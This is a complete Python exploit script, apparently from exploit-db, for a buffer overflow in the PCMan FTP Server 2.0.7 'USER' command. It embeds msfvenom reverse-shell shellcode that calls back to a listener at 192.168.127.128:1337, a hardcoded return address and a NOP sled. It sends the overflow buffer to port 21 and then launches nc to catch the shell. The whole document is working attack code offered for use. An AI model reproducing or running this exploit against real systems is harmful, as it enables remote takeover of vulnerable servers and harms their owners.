#!/usr/bin/env python
#---------------------------------------------------------------------------------------------#
# Software      = PCMan FTP Server 2.0.7 - 'USER'                                             #
# Download Link = https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z   #
# Date          = 9/12/2017                                                                   #
# Reference     = https://www.exploit-db.com/exploits/26471/                                  #
# Author        = @ihack4falafel                                                              #
# Tested on     = Windows XP SP3 - Professional                                               #
# EIP Offset    = 2000                                                                        #
# Badchars      = "\x00\x0A\x0D"                                                              #
# RET Address   = 0x7e429353 : "\xFF\xE4" | [USER32.dll]                                      #
# Usage         = python exploit.py <target IP>                                               #        
#---------------------------------------------------------------------------------------------#

import sys
import socket
import struct
import time
import subprocess

#---------------#---------#  
W  = '\033[0m'  # White   #
R  = '\033[31m' # Red     #
G  = '\033[32m' # Green   #
O  = '\033[33m' # Orange  #
B  = '\033[34m' # Blue    #
P  = '\033[35m' # Purple  #
C  = '\033[36m' # Cyan    #
M  = '\033[35m' # Magenta #
Y  = '\033[33m' # Yellow  #
#---------------#---------#


if len(sys.argv) < 2:
  print Y+ "Usage               :" + P+  " python exploit.py <target IP>" +W
  print Y+ "Example             :" + P+  " python exploit.py 127.0.0.1 0"    +W
  sys.exit(0)

HOST     = sys.argv[1]

#---------------------------------------------------------------------------------------------------------------#
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.127.128 LPORT=1337 -b "\x00\x0A\x0D" -f python -v payload #
#---------------------------------------------------------------------------------------------------------------#

payload =  ""
payload += "\xbe\x2d\xf7\xaf\xc6\xdb\xc7\xd9\x74\x24\xf4\x5b"
payload += "\x29\xc9\xb1\x52\x31\x73\x12\x03\x73\x12\x83\xee"
payload += "\xf3\x4d\x33\x0c\x13\x13\xbc\xec\xe4\x74\x34\x09"
payload += "\xd5\xb4\x22\x5a\x46\x05\x20\x0e\x6b\xee\x64\xba"
payload += "\xf8\x82\xa0\xcd\x49\x28\x97\xe0\x4a\x01\xeb\x63"
payload += "\xc9\x58\x38\x43\xf0\x92\x4d\x82\x35\xce\xbc\xd6"
payload += "\xee\x84\x13\xc6\x9b\xd1\xaf\x6d\xd7\xf4\xb7\x92"
payload += "\xa0\xf7\x96\x05\xba\xa1\x38\xa4\x6f\xda\x70\xbe"
payload += "\x6c\xe7\xcb\x35\x46\x93\xcd\x9f\x96\x5c\x61\xde"
payload += "\x16\xaf\x7b\x27\x90\x50\x0e\x51\xe2\xed\x09\xa6"
payload += "\x98\x29\x9f\x3c\x3a\xb9\x07\x98\xba\x6e\xd1\x6b"
payload += "\xb0\xdb\x95\x33\xd5\xda\x7a\x48\xe1\x57\x7d\x9e"
payload += "\x63\x23\x5a\x3a\x2f\xf7\xc3\x1b\x95\x56\xfb\x7b"
payload += "\x76\x06\x59\xf0\x9b\x53\xd0\x5b\xf4\x90\xd9\x63"
payload += "\x04\xbf\x6a\x10\x36\x60\xc1\xbe\x7a\xe9\xcf\x39"
payload += "\x7c\xc0\xa8\xd5\x83\xeb\xc8\xfc\x47\xbf\x98\x96"
payload += "\x6e\xc0\x72\x66\x8e\x15\xd4\x36\x20\xc6\x95\xe6"
payload += "\x80\xb6\x7d\xec\x0e\xe8\x9e\x0f\xc5\x81\x35\xea"
payload += "\x8e\x6d\x61\x8b\xce\x06\x70\x73\xca\xef\xfd\x95"
payload += "\xbe\x1f\xa8\x0e\x57\xb9\xf1\xc4\xc6\x46\x2c\xa1"
payload += "\xc9\xcd\xc3\x56\x87\x25\xa9\x44\x70\xc6\xe4\x36"
payload += "\xd7\xd9\xd2\x5e\xbb\x48\xb9\x9e\xb2\x70\x16\xc9"
payload += "\x93\x47\x6f\x9f\x09\xf1\xd9\xbd\xd3\x67\x21\x05"
payload += "\x08\x54\xac\x84\xdd\xe0\x8a\x96\x1b\xe8\x96\xc2"
payload += "\xf3\xbf\x40\xbc\xb5\x69\x23\x16\x6c\xc5\xed\xfe"
payload += "\xe9\x25\x2e\x78\xf6\x63\xd8\x64\x47\xda\x9d\x9b"
payload += "\x68\x8a\x29\xe4\x94\x2a\xd5\x3f\x1d\x5a\x9c\x1d"
payload += "\x34\xf3\x79\xf4\x04\x9e\x79\x23\x4a\xa7\xf9\xc1"
payload += "\x33\x5c\xe1\xa0\x36\x18\xa5\x59\x4b\x31\x40\x5d"
payload += "\xf8\x32\x41"


#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP               #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

buffer =  "A" * 2000
buffer += struct.pack('<L', 0x7e429353)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (2900-2000-4-40-len(payload))

try:

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, 21))
  print G+ "[+]" +W + " Connected to PCMan FTP Server with IP: %s and port: 21" %(HOST)
  print G+ "[+]" +W + " Sending %s bytes of evil payload" %len(buffer)
  time.sleep(2)
  s.send("USER " + buffer)
  data = s.recv(1024)
  print G+ "[+]" + P+ " Incoming shell" + Y+ " <(^,^)>" +W
  subprocess.call(['nc -lnvp 1337'], shell=True)

except Exception,msg:

  print R+ "[-]" + P+ " Could not connect to PCMan FTP Server" + Y+ " (._.)" +W
  sys.exit(0)

